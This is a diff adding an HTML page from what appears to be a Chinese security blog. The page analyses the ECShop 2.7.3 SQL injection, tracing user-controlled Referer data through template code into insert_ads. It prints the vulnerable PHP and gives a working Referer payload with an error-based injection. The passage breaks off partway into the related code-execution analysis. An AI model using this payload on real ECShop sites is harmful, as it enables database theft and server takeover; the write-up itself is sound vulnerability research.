@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ECShop 2.7.3 SQL注入漏洞分析">
+<meta property="og:url" content="http://example.com/2021/08/17/ECShop%202.7.3%20SQL%E6%B3%A8%E5%85%A5%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Beytagh&#39;s blog">
+<meta property="og:description" content="ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724185743520.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724190150121.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724192428010.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724191935540.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724192954265.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724193257522.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210806200643024.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210806201034863.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210808215110997.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210817142618901.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210817142834524.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210817143600903.png">
+<meta property="og:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724220650162.png">
+<meta property="article:published_time" content="2021-08-17T07:07:31.894Z">
+<meta property="article:modified_time" content="2021-11-02T14:23:09.876Z">
+<meta property="article:author" content="Beytagh">
+<meta property="article:tag" content="ECShop 2.7.3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724185743520.png">
+
+<link rel="canonical" href="http://example.com/2021/08/17/ECShop%202.7.3%20SQL%E6%B3%A8%E5%85%A5%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ECShop 2.7.3 SQL注入漏洞分析 | Beytagh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Beytagh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">PWN oh!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fas fa-users fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/17/ECShop%202.7.3%20SQL%E6%B3%A8%E5%85%A5%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/beytagh.jpg">
+      <meta itemprop="name" content="Beytagh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Beytagh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ECShop 2.7.3 SQL注入漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-17 15:07:31" itemprop="dateCreated datePublished" datetime="2021-08-17T15:07:31+08:00">2021-08-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-02 22:23:09" itemprop="dateModified" datetime="2021-11-02T22:23:09+08:00">2021-11-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。</p>
+<span id="more"></span>
+
+<p>2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop 2.x版本的0day漏洞攻击。</p>
+<p>本测试环境是2.7.3，理论上2.x的都存在该漏洞，3.x自带WAF（ecshop/includes/safety.php），对所有传入的参数都做了检测会触发SQL注入的检测规则（存在绕过）。</p>
+<p>本环境下载地址：<a target="_blank" rel="noopener" href="https://www.ecshop119.com/ecshopjc-125.html">https://www.ecshop119.com/ecshopjc-125.html</a></p>
+<br>
+
+<h2 id="一、SQL注入漏洞"><a href="#一、SQL注入漏洞" class="headerlink" title="一、SQL注入漏洞"></a>一、SQL注入漏洞</h2><p>ecshop/user.php</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724185743520.png" alt="image-20210724185743520"></p>
+<p>重点关注<code>$back_act</code>，它是从<code>HTTP_REFERER</code>获取的值，而<code>HTTP_REFERER</code>是外部可控的</p>
+<p>接着<code>back_act</code>变量传递给<code>assign</code>函数，接着寻找到ecshop/includes/cls_template.php中</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724190150121.png" alt="image-20210724190150121"></p>
+<p>注册变量，分析功能<code>$this-&gt;_var[$tpl_var] = $value;</code></p>
+<p>也就是<code>back_act</code>变成了<code>$this-&gt;_var[$back_act]=$back_act</code></p>
+<p>继续回到user.php，调用完<code>assign</code>后接着调用了<code>display</code>，还是在cls_template.php跟进</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724192428010.png" alt="image-20210724192428010"></p>
+<p>从流程上来看，首先调用<code>$this-&gt;fetch</code>来处理user_passport.dwt模板文件</p>
+<p>user_passport.dwt是在user.php中写死的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;back_act&#x27;</span>, <span class="variable">$back_act</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;user_passport.dwt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>在<code>fetch</code>函数中调用了<code>$this-&gt;make_compiled</code>来编译模板</p>
+<p><code>make_compiled</code>函数也在cls_template.php中，功能是会将模板中的变量解析</p>
+<p>user_passport.dwt部分内容</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724191935540.png" alt="image-20210724191935540"></p>
+<p>大致内容就是把上面<code>assign</code>中注册到的变量<code>$back_act</code>传递进去，解析完的变量返回到</p>
+<p><code>display</code>函数中，<code>$out</code>就是解析变量后的html内容。</p>
+<p>接着回到<code>display</code>函数中，判断<code>$this-&gt;_echash</code>是否在<code>$out</code>中，若在，使用<code>$this-&gt;_echash</code>来分割内容，得到<code>$k</code>然后交给<code>insert_mod</code>处理。</p>
+<p><code>_echash</code>是被定义好的，不会变，所以导致$val内容可以被控制</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724192954265.png" alt="image-20210724192954265"></p>
+<p>继续回到<code>display</code>函数中，跟进<code>$this-&gt;insert_mod</code></p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724193257522.png" alt="image-20210724193257522"></p>
+<p><code>$val</code>传递给<code>insert_mod</code>，先用<code>|</code>分割，得到<code>$fun</code>和<code>$para</code></p>
+<p><code>$para</code>进行反序列操作，<code>$fun</code>和insert_字符串拼接</p>
+<p>最后动态调用<code>$fun($para)</code>，由此函数名后半部分可控，参数完全可控。</p>
+<p>接下来寻找insert_开头的可利用函数，在<code>ecshop/includes/lib_insert.php</code>有一个<code>insert_ads</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用指定的广告位的广告</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   integer $id     广告位ID</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   integer $num    广告数量</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$static_res</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$time</span> = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$arr</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="variable">$arr</span>[<span class="string">&#x27;num&#x27;</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sql</span>  = <span class="string">&#x27;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;p.ad_height, p.position_style, RAND() AS rnd &#x27;</span> .</span><br><span class="line">                <span class="string">&#x27;FROM &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="string">&#x27;ad&#x27;</span>) . <span class="string">&#x27; AS a &#x27;</span>.</span><br><span class="line">                <span class="string">&#x27;LEFT JOIN &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="string">&#x27;ad_position&#x27;</span>) . <span class="string">&#x27; AS p ON a.position_id = p.position_id &#x27;</span> .</span><br><span class="line">                <span class="string">&quot;WHERE enabled = 1 AND start_time &lt;= &#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27; AND end_time &gt;= &#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27; &quot;</span>.</span><br><span class="line">                    <span class="string">&quot;AND a.position_id = &#x27;&quot;</span> . <span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&quot;&#x27; &quot;</span> .</span><br><span class="line">                <span class="string">&#x27;ORDER BY rnd LIMIT &#x27;</span> . <span class="variable">$arr</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;db&#x27;</span>]-&gt;GetAll(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$static_res</span>[<span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>]] === <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$sql</span>  = <span class="string">&#x27;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#x27;</span>.</span><br><span class="line">                        <span class="string">&#x27;p.ad_height, p.position_style, RAND() AS rnd &#x27;</span> .</span><br><span class="line">                    <span class="string">&#x27;FROM &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="string">&#x27;ad&#x27;</span>) . <span class="string">&#x27; AS a &#x27;</span>.</span><br><span class="line">                    <span class="string">&#x27;LEFT JOIN &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;ecs&#x27;</span>]-&gt;table(<span class="string">&#x27;ad_position&#x27;</span>) . <span class="string">&#x27; AS p ON a.position_id = p.position_id &#x27;</span> .</span><br><span class="line">                    <span class="string">&quot;WHERE enabled = 1 AND a.position_id = &#x27;&quot;</span> . <span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>] .</span><br><span class="line">                        <span class="string">&quot;&#x27; AND start_time &lt;= &#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27; AND end_time &gt;= &#x27;&quot;</span> . <span class="variable">$time</span> . <span class="string">&quot;&#x27; &quot;</span> .</span><br><span class="line">                    <span class="string">&#x27;ORDER BY rnd LIMIT 1&#x27;</span>;</span><br><span class="line">            <span class="variable">$static_res</span>[<span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>]] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;db&#x27;</span>]-&gt;GetAll(<span class="variable">$sql</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$static_res</span>[<span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ads</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$position_style</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$res</span> <span class="keyword">AS</span> <span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;position_id&#x27;</span>] != <span class="variable">$arr</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$position_style</span> = <span class="variable">$row</span>[<span class="string">&#x27;position_style&#x27;</span>];</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$row</span>[<span class="string">&#x27;media_type&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 图片广告</span></span><br><span class="line">                <span class="variable">$src</span> = (strpos(<span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>], <span class="string">&#x27;http://&#x27;</span>) === <span class="literal">false</span> &amp;&amp; strpos(<span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>], <span class="string">&#x27;https://&#x27;</span>) === <span class="literal">false</span>) ?</span><br><span class="line">                        DATA_DIR . <span class="string">&quot;/afficheimg/<span class="subst">$row</span>[ad_code]&quot;</span> : <span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>];</span><br><span class="line">                <span class="variable">$ads</span>[] = <span class="string">&quot;&lt;a href=&#x27;affiche.php?ad_id=<span class="subst">$row</span>[ad_id]&amp;amp;uri=&quot;</span> .urlencode(<span class="variable">$row</span>[<span class="string">&quot;ad_link&quot;</span>]). <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">                target=&#x27;_blank&#x27;&gt;&lt;img src=&#x27;<span class="subst">$src</span>&#x27; width=&#x27;&quot;</span> .<span class="variable">$row</span>[<span class="string">&#x27;ad_width&#x27;</span>]. <span class="string">&quot;&#x27; height=&#x27;<span class="subst">$row</span>[ad_height]&#x27;</span></span><br><span class="line"><span class="string">                border=&#x27;0&#x27; /&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Flash</span></span><br><span class="line">                <span class="variable">$src</span> = (strpos(<span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>], <span class="string">&#x27;http://&#x27;</span>) === <span class="literal">false</span> &amp;&amp; strpos(<span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>], <span class="string">&#x27;https://&#x27;</span>) === <span class="literal">false</span>) ?</span><br><span class="line">                        DATA_DIR . <span class="string">&quot;/afficheimg/<span class="subst">$row</span>[ad_code]&quot;</span> : <span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>];</span><br><span class="line">                <span class="variable">$ads</span>[] = <span class="string">&quot;&lt;object classid=\&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\&quot; &quot;</span> .</span><br><span class="line">                         <span class="string">&quot;codebase=\&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0\&quot;  &quot;</span> .</span><br><span class="line">                           <span class="string">&quot;width=&#x27;<span class="subst">$row</span>[ad_width]&#x27; height=&#x27;<span class="subst">$row</span>[ad_height]&#x27;&gt;</span></span><br><span class="line"><span class="string">                           &lt;param name=&#x27;movie&#x27; value=&#x27;<span class="subst">$src</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">                           &lt;param name=&#x27;quality&#x27; value=&#x27;high&#x27;&gt;</span></span><br><span class="line"><span class="string">                           &lt;embed src=&#x27;<span class="subst">$src</span>&#x27; quality=&#x27;high&#x27;</span></span><br><span class="line"><span class="string">                           pluginspage=&#x27;http://www.macromedia.com/go/getflashplayer&#x27;</span></span><br><span class="line"><span class="string">                           type=&#x27;application/x-shockwave-flash&#x27; width=&#x27;<span class="subst">$row</span>[ad_width]&#x27;</span></span><br><span class="line"><span class="string">                           height=&#x27;<span class="subst">$row</span>[ad_height]&#x27;&gt;&lt;/embed&gt;</span></span><br><span class="line"><span class="string">                         &lt;/object&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// CODE</span></span><br><span class="line">                <span class="variable">$ads</span>[] = <span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// TEXT</span></span><br><span class="line">                <span class="variable">$ads</span>[] = <span class="string">&quot;&lt;a href=&#x27;affiche.php?ad_id=<span class="subst">$row</span>[ad_id]&amp;amp;uri=&quot;</span> .urlencode(<span class="variable">$row</span>[<span class="string">&quot;ad_link&quot;</span>]). <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">                target=&#x27;_blank&#x27;&gt;&quot;</span> .htmlspecialchars(<span class="variable">$row</span>[<span class="string">&#x27;ad_code&#x27;</span>]). <span class="string">&#x27;&lt;/a&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$position_style</span> = <span class="string">&#x27;str:&#x27;</span> . <span class="variable">$position_style</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$need_cache</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;caching;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;caching = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;assign(<span class="string">&#x27;ads&#x27;</span>, <span class="variable">$ads</span>);</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;fetch(<span class="variable">$position_style</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;smarty&#x27;</span>]-&gt;caching = <span class="variable">$need_cache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>$arr</code>是可控的，并且会拼接到SQL语句中，这里就造成了SQL注入漏洞</p>
+<p>回顾上面的流程，构造payload</p>
+<blockquote>
+<p>echash+fun|serialize(array(“num”=&gt;sqlpayload,”id”=&gt;1))</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<br>
+
+<h2 id="二、代码执行漏洞"><a href="#二、代码执行漏洞" class="headerlink" title="二、代码执行漏洞"></a>二、代码执行漏洞</h2><p>继续跟进lib_insert.php中的<code>insert_ads</code>函数</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210806200643024.png" alt="image-20210806200643024"></p>
+<p>第215行中调用了<code>fetch</code>方法，<code>fetch</code>方法在<code>user.php</code>中调用<code>display</code></p>
+<p>然后调用<code>fetch</code>的时候传入的参数是<code>user_passport.dwt</code></p>
+<p>而在此处传入的参数是<code>$position_style</code></p>
+<p>向上溯源，发现是<code>$row[&#39;position_style&#39;]</code>赋值而来，也就是SQL语句查询的结果，结果</p>
+<p>上面这个SQL注入漏洞，SQL查询的结果可控，也就是<code>$position_style</code>可控</p>
+<p>但是要到<code>$position_style = $row[&#39;position_style&#39;];</code>需要满足<code>$row[&#39;position_id&#39;] != $arr[&#39;id&#39;]</code>，但是查询结果可控，<code>arr[&#39;id&#39;]</code>同样可控。</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210806201034863.png" alt="image-20210806201034863"></p>
+<p>之后<code>$position_style</code>会先拼接<code>&#39;str:&#39;</code>传入再<code>fetch</code>函数</p>
+<p>继续跟进<code>fetch</code></p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210808215110997.png" alt="image-20210808215110997"></p>
+<p>看回前面的<code>fetch($position_style)</code>前面拼接了<code>&#39;str:&#39;</code>，所以<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>为真，紧接着就调用了危险函数<code>$this-&gt;_eval</code>，<strong>这就是最终触发漏洞的点</strong></p>
+<p>再看<code>$this-&gt;_eval</code>传参时需要经过<code>$this-&gt;fetch_str</code>方法</p>
+<p>接着跟进<code>fetch_str</code>函数</p>
+<p>第一个正则匹配了一些关键字，替换为空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$source</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二正则就是漏洞点</strong></p>
